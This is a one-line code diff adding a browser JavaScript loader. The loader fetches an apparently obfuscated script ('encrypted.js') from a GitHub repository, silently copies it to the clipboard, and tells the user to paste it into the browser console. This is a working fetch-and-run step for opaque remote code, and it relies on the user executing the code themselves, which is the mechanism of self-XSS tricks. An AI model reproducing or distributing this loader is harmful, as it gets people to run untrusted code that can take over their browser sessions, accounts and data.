@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/dec3ptixns/orb/main/source/encrypted.js').then(response=>response.text()).then(data=>{const textarea=document.createElement('textarea');textarea.value=data;document.body.appendChild(textarea);textarea.select();document.execCommand('copy');textarea.remove();console.warn("Use CTRL+V to paste the script to the console.")});
